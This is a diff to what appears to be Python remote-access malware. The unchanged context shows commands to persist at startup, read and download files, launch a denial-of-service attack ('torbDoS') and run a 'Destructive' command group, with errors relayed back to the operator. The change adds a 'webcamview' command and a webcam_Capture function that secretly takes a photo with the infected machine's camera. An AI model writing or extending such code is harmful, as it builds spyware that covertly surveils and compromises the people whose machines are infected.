@@ -68,6 +68,7 @@ from random import randint
 import random
 import time
 import string
+import cv2
 
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -263,6 +264,15 @@ def main():
 				print "Embedding to startup..."
 				storeStart()
 				q = z
+			# Activate web camera and save screenshot
+			elif z == "webcamview":
+				try:
+					print "Capturing web cam screenshot..."
+					webcam_Capture()
+				except:
+					print "Webcam not found"
+					relayMe("Web Cam Screenshot Error\n\nWeb cam not found on this machine...")
+				q = z
 			# Put server to rest / Stop all commands
 			elif z == "sleep":
 				print "Entering sleep state..."
@@ -381,6 +391,15 @@ def main():
 			elif z == "startup":
 				print "Embedding to startup..."
 				storeStart()
+				q = z
+			# Activate web camera and save screenshot
+			elif z == "webcamview":
+				try:
+					print "Capturing web cam screenshot..."
+					webcam_Capture()
+				except:
+					print "Webcam not found"
+					comm_backup("Web Cam Screenshot Error\n\nWeb cam not found on this machine...")
 				q = z
 			# Put server to rest / Stop all commands
 			elif z == "sleep":
@@ -929,6 +948,20 @@ def torbDoS(ddsHost):
     print "%s : %s" % (xdd,ydd)
     run(xdd,ydd)
 
+# This feature is unfinished....
+# Wecam capture under-construction
+def webcam_Capture():
+	cap = cv2.VideoCapture(0)
+
+	ret, frame = cap.read()
+	rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)
+
+	cv2.imshow('frame', rgb)
+	out = cv2.imwrite('wc_capture.jpg', frame)
+
+	cap.release()
+	cv2.destroyAllWindows()
+
 cmdList = """
 [Fun]:
 	msg [message] - Display Windows Message
@@ -945,6 +978,7 @@ cmdList = """
 	scandir [dir] - Scan Directory
 	read [dir] - Read File Content
 	download [dir] - Download File
+	webcamview - Take Web Cam Screenshot (un-finished)
 	startup - Embed to Startup
 
 [Destructive]:
